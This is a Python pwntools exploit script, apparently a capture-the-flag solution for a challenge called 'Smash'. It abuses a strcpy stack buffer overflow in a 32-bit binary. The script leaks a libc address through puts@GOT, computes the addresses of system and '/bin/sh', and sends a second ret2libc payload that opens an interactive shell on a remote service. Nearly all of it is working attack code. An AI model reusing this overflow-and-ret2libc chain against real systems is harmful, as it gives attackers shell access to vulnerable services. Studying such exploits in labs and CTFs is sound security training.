"""
Challenge: Smash
32-bit ELF, No PIE, No canary, NX enabled, Partial RELRO

Vulnerabilities in say_hello():
  - strcpy(buffer, name)   → stack buffer overflow (128-byte buffer)
  - printf(buffer)         → format string (not used in this exploit)

Plan:
  Stage 1 - overflow ret addr to puts(puts@GOT), return to main
             → leaks puts' real libc address
  Stage 2 - overflow ret addr to system("/bin/sh"), return to exit
             → interactive shell
"""

from pwn import *

HOST = '10.0.118.104'
PORT = 3377

elf  = ELF('./bin/hello',)
libc = ELF('./bin/libc-2.23.so')

# Fixed addresses (no PIE)
puts_plt  = elf.plt['puts']   # 0x080484c0
puts_got  = elf.got['puts']   # 0x0804a024
main_addr = 0x08048639        # start of main (for looping back)

# Distance from buffer start to saved return address:
#   add $0xffffff80,%esp  →  sub 0x80 (128) bytes for buffer
#   + 4 bytes for saved EBP
OFFSET = 128 + 4  # = 132

# Stage 1: leak the real puts address
io = remote(HOST, PORT)
io.recvuntil(b"What's your name?\n")

#  [132 A's] [puts@plt] [main] [puts@got]
#            ^ret addr  ^puts  ^arg to puts
payload1  = b'A' * OFFSET
payload1 += p32(puts_plt)   # overwrite ret addr → call puts@plt
payload1 += p32(main_addr)  # puts' return addr  → loop back to main
payload1 += p32(puts_got)   # puts' argument     → &puts@GOT (holds real addr)

io.sendline(payload1)

# say_hello prints: "Hello, " + printf(buffer) output + "!\n"
# then control reaches our forged ret → puts(puts@GOT) → 4 leak bytes + "\n"
io.recvuntil(b'!\n')

puts_real   = u32(io.recvn(4))
libc_base   = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
exit_addr   = libc_base + libc.symbols['exit']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'puts      @ {hex(puts_real)}')
log.info(f'libc base @ {hex(libc_base)}')
log.info(f'system    @ {hex(system_addr)}')
log.info(f'/bin/sh   @ {hex(binsh_addr)}')

# Stage 2: system("/bin/sh")
io.recvuntil(b"What's your name?\n")

#  [132 A's] [system] [exit] ["/bin/sh"]
payload2  = b'A' * OFFSET
payload2 += p32(system_addr)  # ret → system
payload2 += p32(exit_addr)    # system's ret → clean exit
payload2 += p32(binsh_addr)   # system's arg → "/bin/sh"

io.sendline(payload2)
io.interactive()
